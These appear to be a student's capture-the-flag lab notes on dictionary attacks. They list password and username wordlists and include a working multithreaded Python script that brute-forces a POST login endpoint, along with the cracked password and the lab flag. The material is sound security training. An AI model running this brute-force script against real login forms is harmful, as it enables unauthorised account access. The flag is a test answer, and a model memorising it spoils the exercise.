# Section 4 — Dictionary Attacks

---

## What Is a Dictionary Attack?

Instead of trying every possible combination, a dictionary attack tests a pre-built list of likely passwords. It's faster because it exploits the human habit of choosing predictable, memorable passwords.

**The better the wordlist matches the target, the higher the success rate.**

---

## Dictionary vs. Brute Force

| Feature | Dictionary Attack | Brute Force |
|---------|------------------|-------------|
| Speed | Fast — limited search space | Slow — tries everything |
| Targeting | Can be tailored to the target | No targeting capability |
| Best against | Weak/common passwords | Any password (given enough time) |
| Fails against | Truly random passwords | Impractical for long/complex passwords |

---

## Wordlist Sources

| Wordlist | Path | Use |
|----------|------|-----|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | General password attacks — millions of leaked passwords |
| 500-worst-passwords | `~/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt` | Fast initial probe |
| top-usernames-shortlist | `~/SecLists/Usernames/top-usernames-shortlist.txt` | Quick username brute force |
| xato-net-10M usernames | `~/SecLists/Usernames/xato-net-10-million-usernames.txt` | Thorough username brute force |
| default-passwords | `~/SecLists/Passwords/Default-Credentials/default-passwords.txt` | Routers, devices, software defaults |

**Custom wordlists:** Build from recon — company name, employee names, industry terms, personal info. The more targeted, the better.

---

## Lab — Dictionary Attack (POST form)

**Objective:** Brute-force a `/dictionary` POST endpoint using a common password wordlist to retrieve the flag.

**Why POST:** The login form sends credentials in the request body (`data={'password': password}`), not in the URL. The script mimics a form submission.

**Why this wordlist:** The 500-worst-passwords list is tiny (500 entries) and fast. Most weak passwords appear here. Only escalate to rockyou.txt if this fails.

---

### The Script (Threaded)

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

ip = "TARGET_IP"
port = TARGET_PORT

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

def try_password(password):
    try:
        response = requests.post(f"http://{ip}:{port}/dictionary", data={"password": password}, timeout=5)
        if response.ok and "flag" in response.json():
            return password, response.json()["flag"]
    except requests.exceptions.RequestException:
        pass
    return None

with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(try_password, p): p for p in passwords}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"Correct password found: {result[0]}")
            print(f"Flag: {result[1]}")
            executor.shutdown(wait=False, cancel_futures=True)
            break
```

**What changed from the PIN script:**
| Change | Reason |
|--------|--------|
| `requests.post(...)` instead of `get` | Login form submits credentials via POST body, not URL |
| `data={"password": password}` | Sends the password as form data — mimics a browser login |
| Wordlist from URL instead of `range()` | Password candidates come from a list, not numeric iteration |

---

### Run It

```bash
python3 dictionary-solver.py
```

**Result:**
```
Correct password found: gateway
Flag: HTB{Brut3_F0rc3_M4st3r}
```

**Q1 Answer:** `HTB{Brut3_F0rc3_M4st3r}`

---

## Exam Notes

- Always start with small, targeted wordlists — 500-worst → rockyou.txt → custom
- POST vs GET matters: check how the login form submits before writing the script (`data=` for POST, params in URL for GET)
- Tailor the wordlist to the target when possible — a gaming site, a corporate portal, and a home router each have different likely passwords
- If the wordlist is local use `.read().splitlines()` on a file instead of downloading via `requests.get()`
